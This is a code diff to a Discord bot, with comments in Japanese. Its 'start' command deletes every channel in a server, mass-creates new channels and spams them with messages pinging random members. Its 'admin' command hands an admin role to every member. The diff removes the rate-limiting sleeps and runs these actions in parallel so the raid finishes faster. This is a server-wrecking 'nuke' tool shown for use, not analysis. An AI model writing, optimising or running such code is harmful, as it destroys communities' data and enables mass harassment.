@@ -52,33 +52,24 @@ async def start(ctx):
     except:
         pass
 
-    # ② 全チャンネル削除（高速）
+    # ② 全チャンネル削除 → 並列実行
+    tasks = []
     for ch in list(guild.channels):
-        try:
-            await ch.delete()
-            await asyncio.sleep(0.12)
-        except:
-            pass
+        tasks.append(ch.delete())
+    await asyncio.gather(*tasks, return_exceptions=True)
 
-    # ③ 新規チャンネル作成：15チャンネル → 約2.3秒
-    new_channels = []
+    # ③ 新規チャンネル作成 → 並列で一気に作成
+    tasks = []
     for i in range(CHANNEL_COUNT):
-        try:
-            ch = await guild.create_text_channel(f"{CHANNEL_NAME}-{i+1}")
-            new_channels.append(ch)
-            await asyncio.sleep(0.15)  # これで15個 ≈ 2.3秒
-        except:
-            pass
+        tasks.append(guild.create_text_channel(f"{CHANNEL_NAME}-{i+1}"))
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    new_channels = [ch for ch in results if isinstance(ch, discord.TextChannel)]
 
-    # ④ ラウンドロビン送信：1周ごと全チャンネルに送る
-    for loop in range(MESSAGE_LOOPS):
-        for ch in new_channels:
-            try:
-                text = random_mentions(guild) + COMBINED_TEXT
-                await ch.send(text)
-                await asyncio.sleep(0.08)
-            except:
-                pass
+    # ④ ラウンドロビン送信 → 1周ごと全チャンネル並列
+    for _ in range(MESSAGE_LOOPS):
+        text = random_mentions(guild) + COMBINED_TEXT
+        tasks = [ch.send(text) for ch in new_channels]
+        await asyncio.gather(*tasks, return_exceptions=True)
 
 
 @bot.command()
@@ -94,13 +85,11 @@ async def admin(ctx):
         except:
             return
 
+    tasks = []
     for m in guild.members:
         if not m.bot and admin_role not in m.roles:
-            try:
-                await m.add_roles(admin_role)
-                await asyncio.sleep(0.2)
-            except:
-                pass
+            tasks.append(m.add_roles(admin_role))
+    await asyncio.gather(*tasks, return_exceptions=True)
 
 
 @bot.event
